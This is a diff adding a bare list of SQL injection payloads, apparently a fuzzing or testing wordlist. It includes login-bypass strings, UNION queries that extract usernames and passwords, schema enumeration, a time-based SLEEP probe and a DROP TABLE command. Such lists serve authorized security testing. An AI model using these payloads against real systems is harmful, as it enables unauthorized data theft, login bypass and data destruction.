@@ -1,0 +1,17 @@
+' OR '1'='1
+' OR 1=1 --
+1' UNION SELECT user,password FROM users--
+1' AND SLEEP(5)--
+' UNION SELECT ExtractValue(1,CONCAT(0x7e,(SELECT user())))--
+1' OR 1=1--
+admin' --
+' OR 'a'='a
+'; DROP TABLE users;--
+1' AND (SELECT COUNT(*) FROM users) > 0--
+1' UNION SELECT @@version--
+1' AND '1'='1
+' OR 1=1 #
+1' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+1' ORDER BY 1--
+1' UNION SELECT 1,2,3,4,5--
